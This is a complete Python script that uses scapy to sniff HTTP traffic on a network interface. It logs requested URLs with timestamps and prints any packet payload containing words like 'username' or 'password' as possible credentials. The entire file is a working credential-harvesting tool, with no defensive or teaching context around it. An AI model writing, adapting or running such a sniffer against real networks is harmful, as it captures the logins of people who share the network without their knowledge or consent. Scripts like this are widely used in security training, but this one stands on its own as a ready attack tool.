#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
from colorama import Fore, init
from datetime import datetime

init(autoreset=True)
iface = "eth0"


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_analysis)


def geturl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    keywords = ['user', 'username', 'name', 'password', 'pass']
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        for keyword in keywords:
            if keyword in load:
                return load


def get_time_now():
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
    print(Fore.GREEN + time, end='')


def packet_analysis(packet):
    if packet.haslayer(http.HTTPRequest):
        url = geturl(packet)
        get_time_now()
        print(f"[+] HTTP Request >> {url}")
        login_info = get_login_info(packet)
        if login_info:
            get_time_now()
            print(Fore.YELLOW + f"[+] Possible username/password {login_info}")


sniff(iface)
